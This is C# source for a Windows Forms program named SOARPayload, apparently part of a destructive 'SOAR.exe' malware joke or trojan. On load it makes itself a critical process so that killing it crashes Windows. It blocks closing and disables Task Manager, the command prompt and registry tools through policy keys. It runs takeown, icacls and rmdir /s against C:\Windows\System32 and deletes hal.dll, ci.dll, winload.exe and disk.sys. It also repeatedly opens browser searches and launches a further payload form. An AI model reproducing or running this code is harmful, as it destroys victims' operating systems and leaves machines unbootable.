﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;

namespace SOAR.exe
{
    public partial class SOARPayload : Form
    {

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        public SOARPayload()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
            r = new Random();
        }
        Random r;

        private void SOARPayload_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void SOARPayload_Load(object sender, EventArgs e)
        {
            int isCritical = 1; // Set as critial process
            int BreakOnTermination = 0x1D; // Value for BreakOnTermination (flag)

            Process.EnterDebugMode(); // Aquire debug mode privileges

            // Setting BreakOnTermination = 1 for the current process
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            RegistryKey rk1 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk1.SetValue("DisableTaskMgr", 1, RegistryValueKind.String); // Disable the use of task manager for the user
            RegistryKey rk2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
            rk2.SetValue("DisableCMD", 1, RegistryValueKind.String); // Disable the use of command prompt for the user
            RegistryKey rk3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
            rk3.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord); // Disable the use of Registry Editor (regedit.msc)

            // Get System32 folder and drivers
            new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"/k color 47 && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username$:F && Rmdir /s C:\Windows\System32") }.Start();
            tmr1.Start();
            tmrAdd.Start();
            tmrNextPayload.Start();
        }

        private void tmr1_Tick(object sender, EventArgs e)
        {
            tmr1.Stop();

            // System files and folders:
            string hal_dll = @"C:\Windows\System32\hal.dll";
            string ci_dll = @"C:\Windows\System32\ci.dll";
            string winload_exe = @"C:\Windows\System32\winload.exe";
            string disk_sys = @"C:\Windows\System32\drivers\disk.sys";

            // Start process of deleting selected system files
            if (File.Exists(hal_dll))
            {
                File.Delete(hal_dll);
            }

            if (File.Exists(ci_dll))
            {
                File.Delete(ci_dll);
            }

            if (File.Exists(winload_exe))
            {
                File.Delete(winload_exe);
            }

            if (File.Exists(disk_sys))
            {
                File.Delete(disk_sys);
            }
        }

        private void tmrAdd_Tick(object sender, EventArgs e)
        {
            tmrAdd.Stop();
            int true_num = r.Next(5); // Random integer: 1-5

            if (true_num == 1)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=SOAR.exe");
            }

            if (true_num == 2)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=JKBgHJgyuGYUgfyuGHJgfytR");
            }

            if (true_num == 3)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=kGHJhGUfyFTYfyuGYUbhjgHJG");
            }

            if (true_num == 4)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=JjvHJfhjVHJvhFfHFVGHfGHFjfJ");
            }

            if (true_num == 5)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=SAY_GOODBYE");
            }
            tmrAdd.Start();
        }

        private void tmrNextPayload_Tick(object sender, EventArgs e)
        {
            tmrNextPayload.Stop();
            var NewForm = new SOARSound();
            NewForm.ShowDialog();
        }
    }
}
